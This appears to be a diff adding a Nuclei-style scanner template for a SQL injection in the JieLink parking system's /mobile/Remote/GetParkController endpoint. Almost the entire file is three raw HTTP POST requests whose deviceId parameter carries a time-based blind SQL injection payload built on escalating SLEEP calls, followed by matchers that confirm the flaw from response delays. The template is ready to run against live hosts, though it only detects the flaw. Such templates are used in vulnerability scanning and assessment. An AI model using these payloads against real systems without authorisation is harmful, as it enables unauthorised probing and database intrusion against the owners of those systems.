@@ -1,0 +1,57 @@
+id: JieLink-GetParkController-sqli
+info:
+  name: JieLink-GetParkController-sqli
+  author: apple
+  severity: high
+  description: JieLink的GetParkController参数存在sql注入。
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /mobile/Remote/GetParkController HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 11
+        Accept: application/json, text/plain
+        X-Requested-With: XMLHttpRequest
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/536.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/536.36
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+
+        deviceId=1'+AND+(SELECT+1811+FROM+(SELECT(SLEEP(3)))HXFg)--+UbcX
+      - |-
+        POST /mobile/Remote/GetParkController HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 64
+        Accept: application/json, text/plain
+        X-Requested-With: XMLHttpRequest
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/536.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/536.36
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+
+        deviceId=1'+AND+(SELECT+1811+FROM+(SELECT(SLEEP(6)))HXFg)--+UbcX
+      - |-
+        POST /mobile/Remote/GetParkController HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 64
+        Accept: application/json, text/plain
+        X-Requested-With: XMLHttpRequest
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/536.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/536.36
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+
+        deviceId=1'+AND+(SELECT+1811+FROM+(SELECT(SLEEP(9)))HXFg)--+UbcX
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6"
+          - "duration_2>=6  && duration_2<=9"
+          - "duration_3>=9  && duration_3<=12"
